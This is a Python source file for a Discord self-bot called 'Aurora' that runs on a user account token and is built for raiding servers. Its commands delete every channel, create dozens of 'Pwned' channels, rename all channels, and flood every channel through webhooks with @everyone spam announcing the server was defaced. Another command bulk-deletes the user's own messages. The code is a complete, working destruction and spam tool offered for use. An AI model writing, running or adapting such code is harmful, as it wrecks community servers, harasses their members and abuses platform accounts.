import asyncio
import json
from concurrent.futures import ThreadPoolExecutor
from logging import config
import random
import discord
from discord import Embed
from datetime import datetime
import pytz
from discord.ext import commands

with open("config.json", "r") as file:
    config_data = json.load(file)

token = config_data["token"]
bot = commands.Bot(command_prefix=config_data["prefix"], self_bot=True)


@bot.command()
async def pg(message):
    async for msg in message.channel.history(limit=10000):
        if msg.author == bot.user:
            try:
                await msg.delete()
            except:
                pass


@bot.command()
async def webhooks(ctx):
    for channel in ctx.guild.text_channels:
        webhook = await channel.create_webhook(name="#aurora-selfbot")
    webhooks = []

    for channel in ctx.guild.text_channels:
        webhooks.extend(await channel.webhooks())

    tasks = []
    for webhook in webhooks:
        for i in range(100): 
            tz = pytz.timezone("America/Santo_Domingo") 
            current_time = datetime.now(tz).strftime("%I:%M %p")  
            embed = discord.Embed()
            embed.set_image(url="https://media.discordapp.net/attachments/1349662985748090983/1349663918506905632/IMG_5439.jpg?ex=67d3ebf9&is=67d29a79&hm=36adba7f3291148493decd3a8ef09f6985371aa967e6b438921ceebdb6a27479&=&format=webp")
            embed.add_field(name="", value=f"**Raid Alas** : {current_time}", inline=False)
            tasks.append(webhook.send(
                content='> || @here @everyone || Server Fvcked by AuroraSelfbot discord.gg/deface ', 
                embed=embed  
            ))

    await asyncio.gather(*tasks)


@bot.command()
async def nuke(ctx):
    async def make_nuke(channel):
        if isinstance(channel, discord.CategoryChannel):
            await channel.delete()
        elif isinstance(channel, discord.TextChannel):
            await channel.delete()
        elif isinstance(channel, discord.VoiceChannel):
            await channel.delete()

    tasks = []
    for channel in ctx.guild.channels:
        task = asyncio.create_task(make_nuke(channel))
        tasks.append(task)

    await asyncio.gather(*tasks)
    await ctx.guild.create_text_channel(name='「☠️」Pwned by aurora self bot'.format(ctx.author))


@bot.command()
async def channels(ctx):
    if ctx.guild:
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(create_channel, [ctx.guild] * 50, ['「☠️」Pwned by aurora self bot'] * 50)) 

def create_channel(guild, channel_name):
    try:
        asyncio.run_coroutine_threadsafe(guild.create_text_channel(name=channel_name), bot.loop)
        return 1
    except Exception as e:
        print(f'Error: {e}')
        return 0


@bot.command()
async def bypass(ctx):
    tasks = []
    for x in ctx.guild.channels:
        try:
            tasks.append(x.edit(name="「☠️」Bypass by aurora self bot"))
        except:
            pass
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    print("""
    (                                                 (                             
    )\ )       (                                      )\ )                    (     
    (()/(       )\ )    (   (             (      )    (()/(   (     (      )   )\ )  
    /(_)) (   (()/(   ))\  )(    (      ))\    (      /(_))( )\   ))\  ( /(  (()/(  
    (_))   )\ ) /(_)) /((_)(()\   )\ )  /((_)   )\  ' (_))  )(( ) /((_) )(_))  ((_)) 
    |_ _| _(_/((_) _|(_))   ((_) _(_/( (_))(  _((_))  / __|((_)_)(_))( ((_)_   _| |  
    | | | ' \))|  _|/ -_) | '_|| ' \))| || || '  \() \__ \/ _` || || |/ _` |/ _` |  
    |___||_||_| |_|  \___| |_|  |_||_|  \_,_||_|_|_|  |___/\__, | \_,_|\__,_|\__,_|       
    """)
    bot.run(token, bot=False, reconnect=True)